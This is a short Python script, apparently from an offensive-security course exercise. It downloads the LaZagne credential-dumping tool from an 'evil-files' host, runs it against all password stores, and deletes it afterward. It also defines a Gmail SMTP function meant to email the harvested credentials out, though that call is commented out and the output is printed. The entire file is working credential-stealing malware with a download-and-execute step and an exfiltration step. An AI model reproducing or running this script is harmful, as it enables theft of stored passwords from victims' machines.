# download, execute, and report
import requests
import subprocess
import smtplib
import os
import tempfile


def download(url):
    get_response = requests.get(url, verify=False)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as output:
        output.write(get_response.content)
    return


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit
    return


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

URL = "http://10.0.2.4/evil-files/LaZagne/Linux/laZagne.py"
download(URL)

EMAIL = "noemailaddress@gmail.com"
PASSWD = "notarealpassword"

command = "python3 laZagne.py all"
output = subprocess.check_output(command, shell=True)

print(output)
#send_mail(EMAIL, PASSWD, output)
os.remove("laZagne.py")

print("Goodbye!")
